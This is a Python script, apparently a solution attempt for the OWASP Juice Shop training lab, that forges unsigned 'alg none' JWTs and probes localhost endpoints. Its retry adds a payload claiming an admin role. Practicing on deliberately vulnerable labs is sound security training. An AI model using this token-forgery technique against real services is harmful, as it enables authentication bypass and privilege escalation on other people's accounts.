
import requests
import base64
import json

def debug_unsigned_jwt():
    SERVER = 'http://localhost:3000'
    print('Debugging Unsigned JWT...')
    
    # 1. Start with a real token if possible (from a normal login) to get the structure right
    # But usually simple email payload is enough.
    # Payload: {"email":"jwtn3d@juice-sh.op"}
    # Timestamps are often required: iat, exp.
    
    import time
    iat = int(time.time())
    exp = iat + 3600
    
    # Structure often found in Juice Shop tokens:
    # {"user":{"id":...,"email":...}, "iat":..., "exp":...}
    # OR simpler?
    # Let's try minimal first: {"email":"jwtn3d@juice-sh.op"}
    
    # Header: {"alg":"none","typ":"JWT"}
    header_data = {"alg":"none","typ":"JWT"}
    payload_data = {"email":"jwtn3d@juice-sh.op", "iat": iat, "exp": exp}
    
    # Encode
    def b64url(d):
        return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).decode().rstrip('=')
        
    header = b64url(header_data)
    payload = b64url(payload_data)
    
    # Signature is empty
    token = f"{header}.{payload}."
    
    print(f"Forged Token: {token}")
    
    headers = {'Authorization': f'Bearer {token}'}
    
    # Try multiple endpoints
    endpoints = [
        '/rest/basket/666',
        '/rest/user/whoami',
        '/api/Users/1'
    ]
    
    s = requests.Session()
    success = False
    for ep in endpoints:
        print(f"Trying {ep}...")
        res = s.get(f'{SERVER}{ep}', headers=headers)
        print(f"Status: {res.status_code}")
        print(f"Response: {res.text[:100]}...")
        if res.ok:
            print("SUCCESS (HTTP 200)!")
            success = True
        elif res.status_code == 500 and "Cannot read properties of undefined" in res.text:
             print("Hit 500 error implying missing object structure.")

    if not success:
        print("\nRetrying with nested payload structure...")
        # Try nested structure: {"data": {...}} or {"user": {...}}
        # Based on error "Cannot read properties of undefined (reading 'id')" seen in whoami
        payload_data = {
            "data": {
                "email":"jwtn3d@juice-sh.op", 
                "id": 666, 
                "username": "jwtn3d",
                "role": "admin"
            },
            "iat": iat, 
            "exp": exp
        }
        payload = b64url(payload_data)
        token = f"{header}.{payload}."
        print(f"New Forged Token: {token}")
        headers = {'Authorization': f'Bearer {token}'}
        
        # Retry whoami specifically as it crashed before
        res = s.get(f'{SERVER}/rest/user/whoami', headers=headers)
        print(f"Retry /rest/user/whoami Status: {res.status_code}")
        print(f"Response: {res.text[:200]}")
        
        if res.ok:
            print("SUCCESS with nested payload!")

if __name__ == '__main__':
    debug_unsigned_jwt()
